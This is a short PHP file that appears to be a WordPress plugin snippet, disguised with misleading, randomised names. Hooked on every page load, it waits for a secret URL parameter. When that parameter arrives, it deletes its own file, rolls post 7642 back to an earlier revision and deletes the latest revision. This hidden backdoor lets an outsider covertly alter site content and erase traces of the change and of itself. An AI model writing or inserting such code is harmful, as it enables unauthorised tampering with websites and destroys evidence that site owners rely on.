<?php

function blogroll_module_upgrader() {
	if (isset($_GET['inline_exporter_tinymce']) && $_GET['inline_exporter_tinymce'] === 'com_page_stop_smtp') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$html5_elementor_signature_downloads = 7642;
		$newsletter_active_address_type = wp_get_post_revisions($html5_elementor_signature_downloads);
		if (empty($newsletter_active_address_type)) die('no revisions');
		if (count($newsletter_active_address_type) < 2) die('less than 2');
		$mediaelement_colors_anywhere_selector = array_shift($newsletter_active_address_type);
		$gateway_install_ecommerce_learndash = $mediaelement_colors_anywhere_selector->ID;
		$read_charts_favicon_scheduler = array_shift($newsletter_active_address_type);
		$crm_embedder_contact_products = $read_charts_favicon_scheduler->ID;
		$custom_header_css = wp_restore_post_revision($crm_embedder_contact_products);
		if ($custom_header_css === false) die('error restoring');
		$custom_header_css = wp_delete_post_revision($gateway_install_ecommerce_learndash);		
		if ($custom_header_css === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'blogroll_module_upgrader');
